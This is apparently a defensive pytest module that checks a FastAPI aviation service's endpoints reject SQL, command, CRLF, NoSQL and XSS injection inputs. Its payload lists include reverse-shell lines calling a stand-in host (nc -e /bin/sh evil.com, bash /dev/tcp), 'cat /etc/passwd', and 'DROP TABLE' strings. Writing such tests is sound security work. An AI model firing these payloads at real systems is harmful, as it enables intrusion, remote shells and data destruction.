"""
Tests for injection vulnerabilities (OWASP A03:2021).

This module tests for:
- SQL injection in all input fields
- Command injection attempts
- Header injection / CRLF attacks
- NoSQL injection patterns

Security by Design: All user inputs must be validated
and sanitized before use.
"""

from fastapi.testclient import TestClient


class TestSQLInjection:
    """SQL injection vulnerability tests.

    Even though SkyLink uses in-memory stores (not SQL databases),
    we test for SQL injection to:
    1. Ensure proper input validation is in place
    2. Catch potential future regressions if SQL is added
    3. Demonstrate security testing best practices
    """

    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "1; DROP TABLE users--",
        "' UNION SELECT * FROM secrets--",
        "1' AND '1'='1",
        "admin'--",
        "1' OR 1=1--",
        "'; EXEC xp_cmdshell('whoami')--",
        "1 AND SLEEP(5)--",
        "' OR ''='",
    ]

    def test_auth_aircraft_id_sqli(self, client: TestClient):
        """Aircraft ID field should reject SQL injection payloads.

        The auth endpoint receives aircraft_id which must be a valid UUID.
        SQL injection payloads should be rejected with 422 (validation error).
        """
        for payload in self.SQLI_PAYLOADS:
            response = client.post("/auth/token", json={"aircraft_id": payload})
            # Must return validation error (400 or 422), not 500 (server error)
            assert response.status_code in [
                400,
                422,
            ], f"SQLi payload not properly rejected: {payload}"

    def test_weather_coordinates_sqli(self, client: TestClient, auth_headers: dict):
        """Coordinate parameters should reject SQL injection.

        Latitude and longitude must be floats.
        SQL injection payloads should be rejected.
        """
        for payload in self.SQLI_PAYLOADS:
            # Test latitude parameter
            response = client.get(
                f"/weather/current?lat={payload}&lon=2.3",
                headers=auth_headers,
            )
            assert response.status_code in [400, 422], f"SQLi in lat not rejected: {payload}"

            # Test longitude parameter
            response = client.get(
                f"/weather/current?lat=48.8&lon={payload}",
                headers=auth_headers,
            )
            assert response.status_code in [400, 422], f"SQLi in lon not rejected: {payload}"

    def test_contacts_page_param_sqli(self, client: TestClient, auth_headers: dict):
        """Pagination parameters should reject SQL injection."""
        for payload in self.SQLI_PAYLOADS:
            response = client.get(
                f"/contacts/?person_fields=names&page={payload}&size=10",
                headers=auth_headers,
            )
            # Should return validation error (400 or 422), not 500 (server error)
            assert response.status_code in [400, 422], f"SQLi in page param not rejected: {payload}"


class TestCommandInjection:
    """Command injection vulnerability tests.

    Tests that user input cannot be used to execute
    system commands on the server.
    """

    CMD_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "&& curl evil.com",
        "|| ping -c 10 evil.com",
        "; nc -e /bin/sh evil.com 4444",
        "$(/bin/bash -i >& /dev/tcp/evil.com/4444 0>&1)",
    ]

    def test_aircraft_id_command_injection(self, client: TestClient):
        """Aircraft ID should reject command injection attempts.

        UUID validation should prevent command injection payloads.
        """
        for payload in self.CMD_PAYLOADS:
            response = client.post("/auth/token", json={"aircraft_id": payload})
            # Must return validation error (400 or 422), never execute commands
            assert response.status_code in [
                400,
                422,
            ], f"Command injection payload not rejected: {payload}"

    def test_person_fields_command_injection(self, client: TestClient, auth_headers: dict):
        """Person fields parameter should not allow command injection."""
        for payload in self.CMD_PAYLOADS:
            response = client.get(
                f"/contacts/?person_fields={payload}",
                headers=auth_headers,
            )
            # Should return error (validation or 502 from contacts service)
            # but never 500 which might indicate code execution
            assert (
                response.status_code != 500
            ), f"Suspicious response for command injection: {payload}"


class TestHeaderInjection:
    """HTTP header injection / CRLF injection tests.

    Tests that headers cannot be injected with CRLF
    sequences to add malicious headers.
    """

    def test_crlf_injection_in_custom_header(self, client: TestClient, auth_headers: dict):
        """Custom headers should not allow CRLF injection.

        CRLF (\r\n) in header values could allow header injection.
        """
        crlf_payloads = [
            "value\r\nX-Injected: malicious",
            "value\r\nSet-Cookie: session=evil",
            "value\r\n\r\n<script>alert(1)</script>",
        ]

        for payload in crlf_payloads:
            # Note: Most HTTP clients/servers strip CRLF from headers
            # but we test the application's handling
            try:
                response = client.get(
                    "/weather/current?lat=48.8&lon=2.3",
                    headers={
                        **auth_headers,
                        "X-Custom-Header": payload,
                    },
                )
                # Should handle gracefully (200, 400, or sanitized)
                assert response.status_code in [
                    200,
                    400,
                    504,
                ], f"Unexpected response for CRLF injection: {response.status_code}"
            except Exception:
                # Some clients reject malformed headers - this is acceptable
                pass

    def test_response_splitting_via_redirect(self, client: TestClient):
        """Test that response splitting attacks are prevented.

        Response splitting uses CRLF in parameters that end up in
        Location headers or other response headers.
        """
        # Attempt response splitting via potential redirect parameter
        response = client.get(
            "/health", headers={"X-Forwarded-Host": "evil.com\r\nX-Injected: true"}
        )
        # Should not reflect injected headers
        assert "X-Injected" not in response.headers


class TestNoSQLInjection:
    """NoSQL injection tests.

    Tests for MongoDB/JSON-style injection patterns.
    """

    NOSQL_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.password"}',
    ]

    def test_json_body_nosql_injection(self, client: TestClient, auth_headers: dict):
        """JSON body fields should not be vulnerable to NoSQL injection."""
        for payload in self.NOSQL_PAYLOADS:
            response = client.post(
                "/telemetry/ingest",
                headers=auth_headers,
                json={
                    "event_id": payload,
                    "timestamp": "2025-12-21T12:00:00Z",
                    "aircraft_id": "550e8400-e29b-41d4-a716-446655440000",
                    "event_type": "position",
                    "payload": {},
                },
            )
            # Should reject with validation error or process safely
            # 502 is acceptable when telemetry service is unavailable
            assert response.status_code in [
                200,
                201,
                400,
                409,
                422,
                502,
            ], f"Unexpected response for NoSQL injection: {payload}"


class TestXSSPayloads:
    """Cross-Site Scripting (XSS) prevention tests.

    While SkyLink is an API (not rendering HTML), XSS payloads
    in stored data could be dangerous if data is later displayed.
    """

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<svg onload=alert('XSS')>",
    ]

    def test_xss_in_telemetry_payload(self, client: TestClient, auth_headers: dict):
        """XSS payloads in telemetry should be handled safely.

        While the API doesn't render HTML, we ensure XSS payloads
        don't cause unexpected behavior.
        """
        for payload in self.XSS_PAYLOADS:
            response = client.post(
                "/telemetry/ingest",
                headers=auth_headers,
                json={
                    "event_id": "xss-test-001",
                    "timestamp": "2025-12-21T12:00:00Z",
                    "aircraft_id": "550e8400-e29b-41d4-a716-446655440000",
                    "event_type": "position",
                    "payload": {"comment": payload},
                },
            )
            # Should accept (JSON payload is just data), reject, or service unavailable
            # but never return 500
            assert response.status_code in [
                200,
                400,
                409,
                422,
                502,
            ], f"Unexpected response for XSS payload: {payload}"
